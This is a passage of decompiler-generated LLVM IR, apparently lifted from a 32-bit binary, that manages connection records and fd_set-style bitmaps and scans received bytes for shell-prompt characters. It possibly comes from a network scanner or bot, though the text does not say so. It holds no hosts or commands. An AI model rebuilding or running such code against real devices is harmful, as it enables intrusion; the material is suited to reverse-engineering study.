  store i32 %v3_804fd83, i32* %eax.global-to-local, align 4
  store i32 %v0_804fd83, i32* %edx.global-to-local, align 4
  %v1_804fd88 = add i32 %v0_804fd83, 288
  store i32 %v1_804fd88, i32* %ecx.global-to-local, align 4
  %v1_804fd8e = icmp eq i32 %v3_804fd83, 0
  %v1_804fd90 = icmp eq i1 %v1_804fd8e, false
  br i1 %v1_804fd90, label %dec_label_pc_804fd7a, label %dec_label_pc_804fd92.loopexit

dec_label_pc_804fd92.loopexit:                    ; preds = %dec_label_pc_804fd83
  br label %dec_label_pc_804fd92

dec_label_pc_804fd92:                             ; preds = %dec_label_pc_804fd92.loopexit, %dec_label_pc_804fd5c
  %v0_804fd96 = phi i32 [ %v1_804fd7a, %dec_label_pc_804fd92.loopexit ], [ %v0_804fd54, %dec_label_pc_804fd5c ]
  %v3_804fd92 = load i32, i32* %v2_804fd4a, align 4
  store i32 %v3_804fd92, i32* %eax.global-to-local, align 4
  %v1_804fd96 = mul i32 %v0_804fd96, 4
  %v2_804fd96 = add i32 %v1_804fd96, ptrtoint (i32* @global_var_8056200.46 to i32)
  %v3_804fd96 = inttoptr i32 %v2_804fd96 to i32*
  store i32 0, i32* %v3_804fd96, align 4
  %v0_804fda1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fda1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fda1 = add i32 %v1_804fda1, 16
  %v3_804fda1 = inttoptr i32 %v2_804fda1 to i32*
  store i32 %v0_804fda1, i32* %v3_804fda1, align 4
  %v0_804fda4 = load i32, i32* @esp, align 4
  %v1_804fda4 = add i32 %v0_804fda4, 62
  %v2_804fda4 = inttoptr i32 %v1_804fda4 to i32*
  %v3_804fda4 = load i32, i32* %v2_804fda4, align 4
  %v1_804fda8 = trunc i32 %v3_804fda4 to i16
  %v2_804fda8 = load i32, i32* %edx.global-to-local, align 4
  %v3_804fda8 = add i32 %v2_804fda8, 20
  %v4_804fda8 = inttoptr i32 %v3_804fda8 to i16*
  store i16 %v1_804fda8, i16* %v4_804fda8, align 2
  %v0_804fdac = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804fdac, i32* @eax, align 4
  %v0_804fdae = call i32 @function_804f2d0()
  store i32 %v0_804fdae, i32* %eax.global-to-local, align 4
  %v0_804fdb3 = load i32, i32* @ebx, align 4
  store i32 %v0_804fdb3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fca8

dec_label_pc_804fdc0.loopexit:                    ; preds = %dec_label_pc_804fd7a
  br label %dec_label_pc_804fdc0

dec_label_pc_804fdc0:                             ; preds = %dec_label_pc_804fd54, %dec_label_pc_804fcdd, %dec_label_pc_804fca8, %dec_label_pc_804fdc0.loopexit
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804fdc9 = add i32 %v0_804fcd2, 36
  %v2_804fdc9 = inttoptr i32 %v1_804fdc9 to i32*
  %v3_804fdc9 = load i32, i32* %v2_804fdc9, align 4
  %v4_804fdc9 = inttoptr i32 %v3_804fdc9 to i8*
  %v5_804fdce = call i8* @_memset(i8* %v4_804fdc9, i32 0, i32 32)
  %v0_804fdd0 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804fdd0, i32* %ecx.global-to-local, align 4
  %v0_804fdd2 = load i32, i32* @esp, align 4
  %v1_804fdd2 = inttoptr i32 %v0_804fdd2 to i32*
  %v2_804fdd2 = load i32, i32* %v1_804fdd2, align 4
  %v3_804fdd2 = inttoptr i32 %v2_804fdd2 to i8*
  %v2_804fdd6 = load i32, i32* %eax.global-to-local, align 4
  %v5_804fdd6 = call i8* @_memset(i8* %v3_804fdd2, i32 %v2_804fdd6, i32 %v0_804fdd0)
  %v6_804fdd6 = ptrtoint i8* %v5_804fdd6 to i32
  store i32 %v6_804fdd6, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v0_804fdda = load i32, i32* @esp, align 4
  %v1_804fdda = add i32 %v0_804fdda, 1852
  %v2_804fdda = inttoptr i32 %v1_804fdda to i32*
  store i32 0, i32* %v2_804fdda, align 4
  store i32 0, i32* @esi, align 4
  %v0_804fde7.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fde7

dec_label_pc_804fde7:                             ; preds = %dec_label_pc_804fe3a, %dec_label_pc_804fdc0
  %v0_804fde7 = phi i32 [ %v0_804fe49, %dec_label_pc_804fe3a ], [ %v0_804fde7.pre, %dec_label_pc_804fdc0 ]
  %v0_804fdea = load i32, i32* @global_var_80561e0.45, align 32
  store i32 %v0_804fdea, i32* %eax.global-to-local, align 4
  %v2_804fdef = mul i32 %v0_804fde7, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_804fdf7 = add i32 %v0_804fdea, %v2_804fdef
  store i32 %v2_804fdf7, i32* @ebx, align 4
  %v1_804fdf9 = add i32 %v2_804fdf7, 12
  %v2_804fdf9 = inttoptr i32 %v1_804fdf9 to i32*
  %v3_804fdf9 = load i32, i32* %v2_804fdf9, align 4
  store i32 %v3_804fdf9, i32* %edx.global-to-local, align 4
  %v1_804fdfc = add i32 %v3_804fdf9, -1
  %v5_804fdfc = icmp eq i32 %v3_804fdf9, 0
  %v9_804fdfc = icmp eq i32 %v1_804fdfc, 0
  %v2_804fdff = or i1 %v5_804fdfc, %v9_804fdfc
  br i1 %v2_804fdff, label %dec_label_pc_8050910, label %dec_label_pc_804fe05

dec_label_pc_804fe05:                             ; preds = %dec_label_pc_804fde7, %dec_label_pc_8050918
  %v1_804fe0f = phi i32 [ 30, %dec_label_pc_804fde7 ], [ 5, %dec_label_pc_8050918 ]
  %v0_804fe05 = load i32, i32* @global_var_8056190.34, align 16
  store i32 %v0_804fe05, i32* %eax.global-to-local, align 4
  %v1_804fe0a = add i32 %v2_804fdf7, 8
  %v2_804fe0a = inttoptr i32 %v1_804fe0a to i32*
  %v3_804fe0a = load i32, i32* %v2_804fe0a, align 4
  %v2_804fe0d = sub i32 %v0_804fe05, %v3_804fe0a
  store i32 %v2_804fe0d, i32* %eax.global-to-local, align 4
  %tmp272 = icmp ugt i32 %v2_804fe0d, %v1_804fe0f
  br i1 %tmp272, label %dec_label_pc_8050920, label %dec_label_pc_804fe17

dec_label_pc_804fe17:                             ; preds = %dec_label_pc_804fe05
  store i32 %v1_804fdfc, i32* %edx.global-to-local, align 4
  %v1_80508e4 = add i32 %v2_804fdf7, 4
  %v2_80508e4 = inttoptr i32 %v1_80508e4 to i32*
  %v3_80508e4 = load i32, i32* %v2_80508e4, align 4
  %v1_80508e9 = urem i32 %v3_80508e4, 32
  store i32 %v1_80508e9, i32* %eax.global-to-local, align 4
  %v2_80508ec = udiv i32 %v3_80508e4, 32
  store i32 %v2_80508ec, i32* %edx.global-to-local, align 4
  %v0_80508ef = load i32, i32* @esp, align 4
  %v2_80508ef = mul nuw nsw i32 %v2_80508ec, 4
  br i1 %v9_804fdfc, label %dec_label_pc_80508e4, label %dec_label_pc_804fe1e

dec_label_pc_804fe1e:                             ; preds = %dec_label_pc_804fe17
  %v3_804fe29 = add nuw nsw i32 %v2_80508ef, 1684
  %v4_804fe29 = add i32 %v3_804fe29, %v0_80508ef
  %v5_804fe29 = inttoptr i32 %v4_804fe29 to i32*
  %v6_804fe29 = load i32, i32* %v5_804fe29, align 4
  %v9_804fe29 = shl i32 1, %v1_80508e9
  %v12_804fe29 = or i32 %v6_804fe29, %v9_804fe29
  store i32 %v12_804fe29, i32* %v5_804fe29, align 4
  %v0_804fe31 = load i32, i32* @ebx, align 4
  %v1_804fe31 = add i32 %v0_804fe31, 4
  %v2_804fe31 = inttoptr i32 %v1_804fe31 to i32*
  %v3_804fe31 = load i32, i32* %v2_804fe31, align 4
  store i32 %v3_804fe31, i32* %eax.global-to-local, align 4
  %v0_804fe34 = load i32, i32* @edi, align 4
  %v2_804fe34 = sub i32 %v0_804fe34, %v3_804fe31
  %v8_804fe34 = xor i32 %v0_804fe34, %v3_804fe31
  %v9_804fe34 = xor i32 %v2_804fe34, %v0_804fe34
  %v10_804fe34 = and i32 %v9_804fe34, %v8_804fe34
  %v11_804fe34 = icmp slt i32 %v10_804fe34, 0
  %v13_804fe34 = icmp slt i32 %v2_804fe34, 0
  %v2_804fe36 = icmp eq i1 %v13_804fe34, %v11_804fe34
  br i1 %v2_804fe36, label %dec_label_pc_804fe3a, label %dec_label_pc_804fe38

dec_label_pc_804fe38:                             ; preds = %dec_label_pc_804fe1e
  store i32 %v3_804fe31, i32* @edi, align 4
  br label %dec_label_pc_804fe3a

dec_label_pc_804fe3a:                             ; preds = %dec_label_pc_8050910, %dec_label_pc_80508e4, %dec_label_pc_804fe1e, %dec_label_pc_8050981, %dec_label_pc_8050953, %dec_label_pc_8050902, %dec_label_pc_804fe38
  %v0_804fe3a = load i32, i32* @esp, align 4
  %v1_804fe3a = add i32 %v0_804fe3a, 1852
  %v2_804fe3a = inttoptr i32 %v1_804fe3a to i32*
  %v3_804fe3a = load i32, i32* %v2_804fe3a, align 4
  %v1_804fe41 = add i32 %v3_804fe3a, 1
  store i32 %v1_804fe41, i32* %eax.global-to-local, align 4
  store i32 %v1_804fe41, i32* %v2_804fe3a, align 4
  %v0_804fe49 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fe49 = add i32 %v0_804fe49, -255
  %v6_804fe49 = sub i32 254, %v0_804fe49
  %v7_804fe49 = and i32 %v6_804fe49, %v0_804fe49
  %v8_804fe49 = icmp slt i32 %v7_804fe49, 0
  %v9_804fe49 = icmp eq i32 %v1_804fe49, 0
  %v10_804fe49 = icmp slt i32 %v1_804fe49, 0
  %v3_804fe4e = icmp ne i1 %v10_804fe49, %v8_804fe49
  %v4_804fe4e = or i1 %v9_804fe49, %v3_804fe4e
  br i1 %v4_804fe4e, label %dec_label_pc_804fde7, label %dec_label_pc_804fe50

dec_label_pc_804fe50:                             ; preds = %dec_label_pc_804fe3a
  %v0_804fe50 = load i32, i32* @esp, align 4
  %v1_804fe50 = add i32 %v0_804fe50, 1844
  %v2_804fe50 = inttoptr i32 %v1_804fe50 to i32*
  store i32 0, i32* %v2_804fe50, align 4
  %v0_804fe5b = load i32, i32* @esp, align 4
  %v1_804fe5b = add i32 %v0_804fe5b, 1840
  %v2_804fe5b = inttoptr i32 %v1_804fe5b to i32*
  store i32 1, i32* %v2_804fe5b, align 4
  %v0_804fe66 = load i32, i32* @esp, align 4
  %v0_804fe69 = load i32, i32* @edi, align 4
  %v1_804fe69 = load i32, i32* @esi, align 4
  %v2_804fe69 = sub i32 %v0_804fe69, %v1_804fe69
  %v8_804fe69 = xor i32 %v1_804fe69, %v0_804fe69
  %v9_804fe69 = xor i32 %v2_804fe69, %v0_804fe69
  %v10_804fe69 = and i32 %v9_804fe69, %v8_804fe69
  %v11_804fe69 = icmp slt i32 %v10_804fe69, 0
  %v13_804fe69 = icmp slt i32 %v2_804fe69, 0
  %v1_804fe6b = add i32 %v0_804fe66, 1840
  %v2_804fe72 = add i32 %v0_804fe66, -16
  %v3_804fe72 = inttoptr i32 %v2_804fe72 to i32*
  store i32 %v1_804fe6b, i32* %v3_804fe72, align 4
  %v1_804fe73 = add i32 %v0_804fe66, -20
  %v2_804fe73 = inttoptr i32 %v1_804fe73 to i32*
  store i32 0, i32* %v2_804fe73, align 4
  %v1_804fe75 = add i32 %v0_804fe66, 1556
  store i32 %v1_804fe75, i32* %edx.global-to-local, align 4
  %v0_804fe7c = load i32, i32* @edi, align 4
  store i32 %v0_804fe7c, i32* %eax.global-to-local, align 4
  %v2_804fe7e = add i32 %v0_804fe66, -24
  %v3_804fe7e = inttoptr i32 %v2_804fe7e to i32*
  store i32 %v1_804fe75, i32* %v3_804fe7e, align 4
  %v1_804fe7f = add i32 %v0_804fe66, 1684
  store i32 %v1_804fe7f, i32* %ecx.global-to-local, align 4
  %v2_804fe86 = add i32 %v0_804fe66, -28
  %v3_804fe86 = inttoptr i32 %v2_804fe86 to i32*
  store i32 %v1_804fe7f, i32* %v3_804fe86, align 4
  %v2_804fe87 = icmp eq i1 %v13_804fe69, %v11_804fe69
  br i1 %v2_804fe87, label %dec_label_pc_804fe50.dec_label_pc_804fe8b_crit_edge, label %dec_label_pc_804fe89

dec_label_pc_804fe50.dec_label_pc_804fe8b_crit_edge: ; preds = %dec_label_pc_804fe50
  %v0_804fe8b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe8b

dec_label_pc_804fe89:                             ; preds = %dec_label_pc_804fe50
  %v0_804fe89 = load i32, i32* @esi, align 4
  store i32 %v0_804fe89, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe8b

dec_label_pc_804fe8b:                             ; preds = %dec_label_pc_804fe50.dec_label_pc_804fe8b_crit_edge, %dec_label_pc_804fe89
  %v0_804fe8b = phi i32 [ %v0_804fe8b.pre, %dec_label_pc_804fe50.dec_label_pc_804fe8b_crit_edge ], [ %v0_804fe89, %dec_label_pc_804fe89 ]
  %v1_804fe8b = add i32 %v0_804fe8b, 1
  store i32 %v1_804fe8b, i32* %eax.global-to-local, align 4
  %v2_804fe8c = add i32 %v0_804fe66, -32
  %v3_804fe8c = inttoptr i32 %v2_804fe8c to i32*
  store i32 %v1_804fe8b, i32* %v3_804fe8c, align 4
  %v0_804fe8d = call i32 @function_8051c88()
  store i32 %v0_804fe8d, i32* %eax.global-to-local, align 4
  %v0_804fe92 = load i32, i32* @esp, align 4
  %v1_804fe95 = add i32 %v0_804fe92, 16
  %v2_804fe95 = inttoptr i32 %v1_804fe95 to i32*
  store i32 0, i32* %v2_804fe95, align 4
  %v2_804fe97 = call i32 @function_8051d42(i32* nonnull @0)
  %v0_804fe9c = load i32, i32* @esp, align 4
  %v1_804fe9c = add i32 %v0_804fe9c, 1868
  %v2_804fe9c = inttoptr i32 %v1_804fe9c to i32*
  store i32 0, i32* %v2_804fe9c, align 4
  store i32 %v2_804fe97, i32* @global_var_8056190.34, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fee8

dec_label_pc_804feb3:                             ; preds = %dec_label_pc_804fefe, %dec_label_pc_804ff96
  %v0_804fffc25 = phi i32 [ %v2_804fef4, %dec_label_pc_804fefe ], [ %v0_804ffb5, %dec_label_pc_804ff96 ]
  %v0_804febb = phi i32 [ %v0_804ff08, %dec_label_pc_804fefe ], [ %v0_804febb.pre, %dec_label_pc_804ff96 ]
  %v0_804feb3 = phi i32 [ %v3_804fef6, %dec_label_pc_804fefe ], [ %v3_804ffb5, %dec_label_pc_804ff96 ]
  %v2_804feb5 = udiv i32 %v0_804feb3, 32
  store i32 %v2_804feb5, i32* %ecx.global-to-local, align 4
  %v1_804feb8 = urem i32 %v0_804feb3, 32
  store i32 %v1_804feb8, i32* %eax.global-to-local, align 4
  %v2_804febb = mul nuw nsw i32 %v2_804feb5, 4
  %v3_804febb = add i32 %v0_804febb, 1684
  %v4_804febb = add i32 %v3_804febb, %v2_804febb
  %v5_804febb = inttoptr i32 %v4_804febb to i32*
  %v6_804febb = load i32, i32* %v5_804febb, align 4
  %v9_804febb = shl i32 1, %v1_804feb8
  %v10_804febb = and i32 %v6_804febb, %v9_804febb
  %v11_804febb = icmp ne i32 %v10_804febb, 0
  %v1_804fec3 = zext i1 %v11_804febb to i32
  store i32 %v1_804fec3, i32* %eax.global-to-local, align 4
  %v4_804fec6 = icmp eq i1 %v11_804febb, false
  %v1_804fec8 = icmp eq i1 %v4_804fec6, false
  br i1 %v1_804fec8, label %dec_label_pc_804fffc.preheader, label %dec_label_pc_804fece

dec_label_pc_804fffc.preheader:                   ; preds = %dec_label_pc_804feb3
  %v1_804fffc26 = add i32 %v0_804fffc25, 12
  %v2_804fffc27 = inttoptr i32 %v1_804fffc26 to i32*
  %v3_804fffc28 = load i32, i32* %v2_804fffc27, align 4
  store i32 %v3_804fffc28, i32* %eax.global-to-local, align 4
  %v1_804ffff29 = icmp eq i32 %v3_804fffc28, 0
  br i1 %v1_804ffff29, label %dec_label_pc_804fece, label %dec_label_pc_8050007

dec_label_pc_804fece:                             ; preds = %dec_label_pc_804fffc.backedge, %dec_label_pc_804fffc.preheader, %dec_label_pc_80505e6, %dec_label_pc_804feb3, %dec_label_pc_804fee8, %dec_label_pc_8050a57, %dec_label_pc_80509ac, %dec_label_pc_8050624
  %v0_804fece = load i32, i32* @esp, align 4
  %v1_804fece = add i32 %v0_804fece, 1852
  %v2_804fece = inttoptr i32 %v1_804fece to i32*
  %v3_804fece = load i32, i32* %v2_804fece, align 4
  %v1_804fed5 = add i32 %v3_804fece, 1
  store i32 %v1_804fed5, i32* %eax.global-to-local, align 4
  store i32 %v1_804fed5, i32* %v2_804fece, align 4
  %v0_804fedd = load i32, i32* %eax.global-to-local, align 4
  %v1_804fedd = add i32 %v0_804fedd, -255
  %v6_804fedd = sub i32 254, %v0_804fedd
  %v7_804fedd = and i32 %v6_804fedd, %v0_804fedd
  %v8_804fedd = icmp slt i32 %v7_804fedd, 0
  %v9_804fedd = icmp eq i32 %v1_804fedd, 0
  %v10_804fedd = icmp slt i32 %v1_804fedd, 0
  %v3_804fee2 = icmp eq i1 %v10_804fedd, %v8_804fedd
  %v4_804fee2 = icmp eq i1 %v9_804fedd, false
  %v5_804fee2 = and i1 %v4_804fee2, %v3_804fee2
  br i1 %v5_804fee2, label %.loopexit, label %dec_label_pc_804fee8

dec_label_pc_804fee8:                             ; preds = %dec_label_pc_804fece, %dec_label_pc_804fe8b
  %v0_804fee8 = phi i32 [ %v0_804fedd, %dec_label_pc_804fece ], [ 0, %dec_label_pc_804fe8b ]
  %v0_804feeb = load i32, i32* @global_var_80561e0.45, align 32
  store i32 %v0_804feeb, i32* @esi, align 4
  %v2_804fef1 = mul i32 %v0_804fee8, 288
  %v2_804fef4 = add i32 %v0_804feeb, %v2_804fef1
  store i32 %v2_804fef4, i32* @edi, align 4
  %v1_804fef6 = add i32 %v2_804fef4, 4
  %v2_804fef6 = inttoptr i32 %v1_804fef6 to i32*
  %v3_804fef6 = load i32, i32* %v2_804fef6, align 4
  store i32 %v3_804fef6, i32* %ecx.global-to-local, align 4
  %v10_804fef9 = icmp eq i32 %v3_804fef6, -1
  br i1 %v10_804fef9, label %dec_label_pc_804fece, label %dec_label_pc_804fefe

dec_label_pc_804fefe:                             ; preds = %dec_label_pc_804fee8
  %v2_804ff02 = udiv i32 %v3_804fef6, 32
  store i32 %v2_804ff02, i32* %edx.global-to-local, align 4
  %v1_804ff05 = urem i32 %v3_804fef6, 32
  store i32 %v1_804ff05, i32* %eax.global-to-local, align 4
  %v0_804ff08 = load i32, i32* @esp, align 4
  %v2_804ff08 = mul nuw nsw i32 %v2_804ff02, 4
  %v3_804ff08 = add nuw nsw i32 %v2_804ff08, 1556
  %v4_804ff08 = add i32 %v3_804ff08, %v0_804ff08
  %v5_804ff08 = inttoptr i32 %v4_804ff08 to i32*
  %v6_804ff08 = load i32, i32* %v5_804ff08, align 4
  %v9_804ff08 = shl i32 1, %v1_804ff05
  %v10_804ff08 = and i32 %v6_804ff08, %v9_804ff08
  %v11_804ff08 = icmp ne i32 %v10_804ff08, 0
  %v1_804ff10 = zext i1 %v11_804ff08 to i32
  store i32 %v1_804ff10, i32* %eax.global-to-local, align 4
  %v4_804ff13 = icmp eq i1 %v11_804ff08, false
  br i1 %v4_804ff13, label %dec_label_pc_804feb3, label %dec_label_pc_804ff17

dec_label_pc_804ff17:                             ; preds = %dec_label_pc_804fefe
  %v1_804ff17 = add i32 %v0_804ff08, 1856
  %v2_804ff17 = inttoptr i32 %v1_804ff17 to i32*
  store i32 0, i32* %v2_804ff17, align 4
  %v0_804ff22 = load i32, i32* @esp, align 4
  %v1_804ff22 = add i32 %v0_804ff22, 1848
  %v2_804ff22 = inttoptr i32 %v1_804ff22 to i32*
  store i32 4, i32* %v2_804ff22, align 4
  %v0_804ff2d = load i32, i32* @esp, align 4
  %v1_804ff30 = add i32 %v0_804ff2d, 1848
  %v2_804ff37 = add i32 %v0_804ff2d, -16
  %v3_804ff37 = inttoptr i32 %v2_804ff37 to i32*
  store i32 %v1_804ff30, i32* %v3_804ff37, align 4
  %v1_804ff38 = add i32 %v0_804ff2d, 1856
  store i32 %v1_804ff38, i32* %eax.global-to-local, align 4
  %v2_804ff3f = add i32 %v0_804ff2d, -20
  %v3_804ff3f = inttoptr i32 %v2_804ff3f to i32*
  store i32 %v1_804ff38, i32* %v3_804ff3f, align 4
  %v1_804ff40 = add i32 %v0_804ff2d, -24
  %v2_804ff40 = inttoptr i32 %v1_804ff40 to i32*
  store i32 4, i32* %v2_804ff40, align 4
  %v1_804ff42 = add i32 %v0_804ff2d, -28
  %v2_804ff42 = inttoptr i32 %v1_804ff42 to i32*
  store i32 1, i32* %v2_804ff42, align 4
  %v0_804ff44 = load i32, i32* @edi, align 4
  %v1_804ff44 = add i32 %v0_804ff44, 4
  %v2_804ff44 = inttoptr i32 %v1_804ff44 to i32*
  %v3_804ff44 = load i32, i32* %v2_804ff44, align 4
  store i32 %v3_804ff44, i32* @ebx, align 4
  %v2_804ff47 = add i32 %v0_804ff2d, -32
  %v3_804ff47 = inttoptr i32 %v2_804ff47 to i32*
  store i32 %v3_804ff44, i32* %v3_804ff47, align 4
  %v0_804ff48 = call i32 @function_80520f0()
  store i32 %v0_804ff48, i32* %eax.global-to-local, align 4
  %v0_804ff4d = load i32, i32* @esp, align 4
  %v2_804ff50 = add i32 %v0_804ff4d, 1888
  %v3_804ff50 = inttoptr i32 %v2_804ff50 to i32*
  %v4_804ff50 = load i32, i32* %v3_804ff50, align 4
  %v5_804ff50 = or i32 %v4_804ff50, %v0_804ff48
  %v6_804ff50 = icmp eq i32 %v5_804ff50, 0
  store i32 %v5_804ff50, i32* %eax.global-to-local, align 4
  %v1_804ff57 = icmp eq i1 %v6_804ff50, false
  br i1 %v1_804ff57, label %dec_label_pc_8050a57, label %dec_label_pc_804ff5d

dec_label_pc_804ff5d:                             ; preds = %dec_label_pc_804ff17
  %v1_804ff5d = add i32 %v0_804ff4d, 1884
  %v2_804ff5d = inttoptr i32 %v1_804ff5d to i32*
  %v3_804ff5d = load i32, i32* %v2_804ff5d, align 4
  store i32 %v3_804ff5d, i32* %eax.global-to-local, align 4
  %v0_804ff64 = load i32, i32* @global_var_8056158.47, align 8
  store i32 %v0_804ff64, i32* %ecx.global-to-local, align 4
  %v0_804ff6a = load i32, i32* @edi, align 4
  %v1_804ff6a = add i32 %v0_804ff6a, 12
  %v2_804ff6a = inttoptr i32 %v1_804ff6a to i32*
  store i32 2, i32* %v2_804ff6a, align 4
  %v0_804ff71 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ff71 = mul i32 %v0_804ff71, 4
  %v2_804ff71 = add i32 %v1_804ff71, 134570496
  %v3_804ff71 = inttoptr i32 %v2_804ff71 to i32*
  %v4_804ff71 = load i32, i32* %v3_804ff71, align 4
  store i32 %v4_804ff71, i32* %edx.global-to-local, align 4
  %v0_804ff78 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ff78 = add i32 %v0_804ff78, -1
  store i32 %v1_804ff78, i32* %eax.global-to-local, align 4
  %v2_804ff7b = sub i32 %v4_804ff71, %v1_804ff78
  %v8_804ff7b = xor i32 %v1_804ff78, %v4_804ff71
  %v9_804ff7b = xor i32 %v2_804ff7b, %v4_804ff71
  %v10_804ff7b = and i32 %v9_804ff7b, %v8_804ff7b
  %v11_804ff7b = icmp slt i32 %v10_804ff7b, 0
  %v12_804ff7b = icmp eq i32 %v2_804ff7b, 0
  %v13_804ff7b = icmp slt i32 %v2_804ff7b, 0
  %v3_804ff7d = icmp eq i1 %v13_804ff7b, %v11_804ff7b
  %v4_804ff7d = icmp eq i1 %v12_804ff7b, false
  %v5_804ff7d = and i1 %v4_804ff7d, %v3_804ff7d
  br i1 %v5_804ff7d, label %dec_label_pc_8050a57, label %dec_label_pc_804ff83

dec_label_pc_804ff83:                             ; preds = %dec_label_pc_804ff5d
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804ff85 = sub i32 %v4_804ff71, %v0_804ff78
  %v8_804ff85 = xor i32 %v0_804ff78, %v4_804ff71
  %v9_804ff85 = xor i32 %v2_804ff85, %v4_804ff71
  %v10_804ff85 = and i32 %v9_804ff85, %v8_804ff85
  %v11_804ff85 = icmp slt i32 %v10_804ff85, 0
  %v13_804ff85 = icmp slt i32 %v2_804ff85, 0
  %v2_804ff87 = icmp eq i1 %v13_804ff85, %v11_804ff85
  br i1 %v2_804ff87, label %dec_label_pc_804ff96, label %dec_label_pc_804ff89

dec_label_pc_804ff89:                             ; preds = %dec_label_pc_804ff83
  %v0_804ff8b = load i32, i32* @global_var_8056188.48, align 8
  store i32 %v0_804ff8b, i32* %ecx.global-to-local, align 4
  %v2_804ff91 = mul i32 %v4_804ff71, 16
  %v2_804ff94 = add i32 %v0_804ff8b, %v2_804ff91
  store i32 %v2_804ff94, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff96

dec_label_pc_804ff96:                             ; preds = %dec_label_pc_804ff83, %dec_label_pc_804ff89
  %v0_804ff96 = load i32, i32* @edi, align 4
  %v1_804ff96 = add i32 %v0_804ff96, 24
  %v2_804ff96 = inttoptr i32 %v1_804ff96 to i32*
  store i32 0, i32* %v2_804ff96, align 4
  %v0_804ff9d = load i32, i32* %eax.global-to-local, align 4
  %v1_804ff9d = load i32, i32* @edi, align 4
  %v2_804ff9d = inttoptr i32 %v1_804ff9d to i32*
  store i32 %v0_804ff9d, i32* %v2_804ff9d, align 4
  %v0_804ff9f = load i32, i32* @esp, align 4
  %v1_804ff9f = add i32 %v0_804ff9f, 1852
  %v2_804ff9f = inttoptr i32 %v1_804ff9f to i32*
  %v3_804ff9f = load i32, i32* %v2_804ff9f, align 4
  store i32 %v3_804ff9f, i32* %eax.global-to-local, align 4
  %v1_804ffa6 = mul i32 %v3_804ff9f, 4
  %v2_804ffa6 = add i32 %v1_804ffa6, 134570496
  %v3_804ffa6 = inttoptr i32 %v2_804ffa6 to i32*
  %v4_804ffa6 = load i32, i32* %v3_804ffa6, align 4
  %v1_804ffad = add i32 %v4_804ffa6, 1
  store i32 %v1_804ffad, i32* %edx.global-to-local, align 4
  store i32 %v1_804ffad, i32* %v3_804ffa6, align 4
  %v0_804ffb5 = load i32, i32* @edi, align 4
  %v1_804ffb5 = add i32 %v0_804ffb5, 4
  %v2_804ffb5 = inttoptr i32 %v1_804ffb5 to i32*
  %v3_804ffb5 = load i32, i32* %v2_804ffb5, align 4
  store i32 %v3_804ffb5, i32* %ecx.global-to-local, align 4
  %v0_804febb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804feb3

dec_label_pc_804ffc0:                             ; preds = %dec_label_pc_8050072
  %v1_804ffc0 = add i32 %v0_8050072, 24
  %v2_804ffc0 = inttoptr i32 %v1_804ffc0 to i32*
  %v3_804ffc0 = load i32, i32* %v2_804ffc0, align 4
  %v1_804ffc3 = add i32 %v3_804ffc0, -1
  store i32 %v1_804ffc3, i32* %eax.global-to-local, align 4
  %tmp125 = icmp slt i32 %v1_804ffc3, 1
  br i1 %tmp125, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_804ffc8.preheader

dec_label_pc_804ffc8.preheader:                   ; preds = %dec_label_pc_804ffc0
  %v7_804ffc8.pre = load i32, i32* @edx, align 4
  %v2_804ffc8 = add i32 %v0_8050072, 28
  br label %dec_label_pc_804ffc8

dec_label_pc_804ffc8:                             ; preds = %dec_label_pc_804ffc8.preheader, %dec_label_pc_804fff9
  %v7_804ffc8 = phi i32 [ %v7_804ffc8.pre, %dec_label_pc_804ffc8.preheader ], [ %v9_804ffc8, %dec_label_pc_804fff9 ]
  %v0_8050733 = phi i32 [ %v1_804ffc3, %dec_label_pc_804ffc8.preheader ], [ %v1_804fff9, %dec_label_pc_804fff9 ]
  %v3_804ffc8 = add i32 %v2_804ffc8, %v0_8050733
  %v4_804ffc8 = inttoptr i32 %v3_804ffc8 to i8*
  %v5_804ffc8 = load i8, i8* %v4_804ffc8, align 1
  %v6_804ffc8 = zext i8 %v5_804ffc8 to i32
  %v8_804ffc8 = and i32 %v7_804ffc8, -256
  %v9_804ffc8 = or i32 %v6_804ffc8, %v8_804ffc8
  store i32 %v9_804ffc8, i32* %edx.global-to-local, align 4
  %v10_804ffcc = icmp eq i8 %v5_804ffc8, 58
  br i1 %v10_804ffcc, label %dec_label_pc_8050733, label %dec_label_pc_804ffd5

dec_label_pc_804ffd5:                             ; preds = %dec_label_pc_804ffc8
  %v10_804ffd5 = icmp eq i8 %v5_804ffc8, 62
  br i1 %v10_804ffd5, label %dec_label_pc_8050733, label %dec_label_pc_804ffde

dec_label_pc_804ffde:                             ; preds = %dec_label_pc_804ffd5
  %v10_804ffde = icmp eq i8 %v5_804ffc8, 36
  br i1 %v10_804ffde, label %dec_label_pc_8050733, label %dec_label_pc_804ffe7

dec_label_pc_804ffe7:                             ; preds = %dec_label_pc_804ffde
  %v10_804ffe7 = icmp eq i8 %v5_804ffc8, 35
  br i1 %v10_804ffe7, label %dec_label_pc_8050733, label %dec_label_pc_804fff0

dec_label_pc_804fff0:                             ; preds = %dec_label_pc_804ffe7
  %v10_804fff0 = icmp eq i8 %v5_804ffc8, 37
  br i1 %v10_804fff0, label %dec_label_pc_8050733, label %dec_label_pc_804fff9

dec_label_pc_804fff9:                             ; preds = %dec_label_pc_804fff0
  %v1_804fff9 = add i32 %v0_8050733, -1
  %v8_804fff9 = icmp eq i32 %v1_804fff9, 0
  store i32 %v1_804fff9, i32* %eax.global-to-local, align 4
  %v1_804fffa = icmp eq i1 %v8_804fff9, false
